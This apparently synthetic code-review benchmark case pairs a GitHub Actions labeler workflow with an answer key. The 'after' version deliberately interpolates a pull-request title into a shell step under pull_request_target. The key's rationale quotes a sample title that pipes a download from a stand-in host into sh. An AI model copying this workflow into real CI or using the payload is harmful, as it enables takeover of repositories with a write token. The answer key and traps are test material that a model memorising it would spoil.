@@ -1,0 +1,45 @@
+{
+ "case_id": "cl_syn_workflow_title_injection",
+ "title": "Label release PRs automatically, also for forks",
+ "pr_body": "Switch to pull_request_target so labels can be added on PRs from forks, and add a `release` label when the title starts with `release:`.",
+ "language": "yaml",
+ "kind": "bug",
+ "criticality": "critical",
+ "split": "dev",
+ "source": "synthetic",
+ "provenance": "written for this benchmark",
+ "tags": [
+  "security",
+  "ci_workflow",
+  "command_injection"
+ ],
+ "files": [
+  {
+   "path": ".github/workflows/labeler.yml",
+   "before": "name: PR labeler\n\non:\n  pull_request:\n    types: [opened, edited, synchronize]\n\npermissions:\n  contents: read\n  pull-requests: write\n\njobs:\n  label:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/labeler@8558fd74291d67161a8a78ce36a881fa63b766a9 # v5\n",
+   "after": "name: PR labeler\n\non:\n  pull_request_target:\n    types: [opened, edited, synchronize]\n\npermissions:\n  contents: read\n  pull-requests: write\n\njobs:\n  label:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/labeler@8558fd74291d67161a8a78ce36a881fa63b766a9 # v5\n      - name: Label release PRs\n        env:\n          GH_TOKEN: ${{ github.token }}\n          PR_NUMBER: ${{ github.event.pull_request.number }}\n        run: |\n          title=\"${{ github.event.pull_request.title }}\"\n          if [[ \"$title\" == release:* ]]; then\n            gh pr edit \"$PR_NUMBER\" --repo \"$GITHUB_REPOSITORY\" --add-label release\n          fi\n"
+  }
+ ],
+ "bugs": [
+  {
+   "id": "title-script-injection",
+   "path": ".github/workflows/labeler.yml",
+   "anchor": "          title=\"${{ github.event.pull_request.title }}\"",
+   "category": "security",
+   "accepted": [],
+   "severity": "critical",
+   "title": "PR title is interpolated into a shell script under pull_request_target",
+   "rationale": "The expression is expanded before bash runs, so a fork PR titled 'x\"; curl evil | sh; \"' executes arbitrary commands in a pull_request_target job that has a write token. Pass the title through an env variable instead.",
+   "extra_anchors": []
+  }
+ ],
+ "traps": [
+  {
+   "path": ".github/workflows/labeler.yml",
+   "anchor": "          PR_NUMBER: ${{ github.event.pull_request.number }}",
+   "rationale": "Passing the number through env is the safe pattern; it is an integer."
+  }
+ ],
+ "author": "claude",
+ "acceptable": []
+}
